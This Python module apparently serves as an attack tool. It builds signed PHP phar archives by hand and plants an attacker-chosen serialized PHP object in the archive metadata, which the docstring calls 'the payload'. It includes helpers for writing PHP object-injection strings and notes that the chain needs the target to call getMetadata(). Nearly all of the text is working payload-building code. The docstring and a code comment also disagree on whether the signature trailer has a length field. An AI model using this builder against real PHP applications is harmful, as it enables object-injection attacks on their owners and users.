"""Building a phar whose metadata is the payload.

The manifest carries a serialized metadata blob, and PHP unserializes it when
something asks for it. What that something is matters, and it is not "any
phar:// operation" - that is a widely repeated claim that does not hold on PHP 8.
Measured on 8.4.24 against an archive built here:

    file_exists / include / file_get_contents / stat
    opendir / new Phar / count / fopen+fread      - nothing happens
    (new Phar(...))->getMetadata()                - unserialized

So the chain needs the target to call `getMetadata()`: framework code does, a
plain `include` does not. Building the archive is still worth having, because
building one must not require PHP to be installed.

Written out by hand rather than with a PHP toolchain for that reason.

Layout, in order:

    stub              a PHP document ending in __HALT_COMPILER(); ?>
    manifest length   4 bytes, little-endian, of everything after it
    manifest          count, api version, flags, alias, metadata, file entries
    file contents     one after another, in manifest order
    signature         sha1 of everything above, its length, and the magic GBMB

The api version is two bytes, not four - it is the one field that catches out
every hand-written builder, and getting it wrong produces an archive PHP refuses
to open at all.
"""

from __future__ import annotations

import hashlib
import struct

# What a phar says it is. 1.1.0 is what contemporary PHP writes and expects.
API_VERSION = 0x1110
# The manifest is signed, so the global flags have to say so.
FLAG_SIGNATURE = 0x00010000
SIGNATURE_SHA1 = 0x0002
SIGNATURE_END = b"GBMB"
DEFAULT_STUB = b"<?php __HALT_COMPILER(); ?>\r\n"


def _u16(value: int) -> bytes:
    return struct.pack("<H", value & 0xFFFF)


def _u32(value: int) -> bytes:
    return struct.pack("<I", value & 0xFFFFFFFF)


def _sized(data: bytes) -> bytes:
    """A length-prefixed blob, which is how the format carries strings."""
    return _u32(len(data)) + data


def manifest(files: list[tuple[str, bytes]], metadata: bytes, alias: str = "") -> bytes:
    """The manifest: what the archive holds, and the blob PHP unserializes."""
    body = _u32(len(files))
    body += _u16(API_VERSION)
    body += _u32(FLAG_SIGNATURE)
    body += _sized(alias.encode("utf-8"))
    body += _sized(metadata)

    for name, content in files:
        body += _sized(name.encode("utf-8"))
        body += _u32(len(content))
        body += _u32(0)  # timestamp
        body += _u32(len(content))  # uncompressed size
        body += _u32(_crc32(content))
        body += _u32(0)  # per-file flags
        body += _sized(b"")  # per-file metadata

    return _u32(len(body)) + body


def _crc32(data: bytes) -> int:
    import zlib

    return zlib.crc32(data) & 0xFFFFFFFF


def build(
    files: list[tuple[str, bytes]],
    metadata: bytes = b"",
    stub: bytes = DEFAULT_STUB,
    alias: str = "",
) -> bytes:
    """A complete, signed phar."""
    if not stub.endswith(b"?>"):
        stub = stub.rstrip() + b"\r\n" if b"__HALT_COMPILER" in stub else DEFAULT_STUB
    if b"__HALT_COMPILER" not in stub:
        stub = DEFAULT_STUB

    out = stub + manifest(files, metadata, alias)
    for _, content in files:
        out += content

    digest = hashlib.sha1(out).digest()
    # The trailer is the digest, the algorithm, and the magic - there is no
    # separate length field. The digest is as long as its algorithm says it is.
    return out + digest + _u32(SIGNATURE_SHA1) + SIGNATURE_END


def php_serialize_string(value: str) -> bytes:
    """One PHP `s:` value, for the metadata blob.

    The blob is PHP's own serialization, not JSON: an object of a class the
    target already has is the whole point, and its property names are part of
    the bytes.
    """
    encoded = value.encode("utf-8")
    return b's:%d:"%s";' % (len(encoded), encoded)


def php_object(class_name: str, properties: dict[str, str]) -> bytes:
    """A PHP object with string properties, as `unserialize` reads it.

    `O:<len>:"<class>":<count>:{s:<len>:"<name>";<value>;...}` - the shape the
    metadata field expects when it is meant to be an object rather than a value.
    """
    body = b""
    for name, value in properties.items():
        body += php_serialize_string(name) + php_serialize_string(value)
    name_bytes = class_name.encode("utf-8")
    return b'O:%d:"%s":%d:{%s}' % (len(name_bytes), name_bytes, len(properties), body)
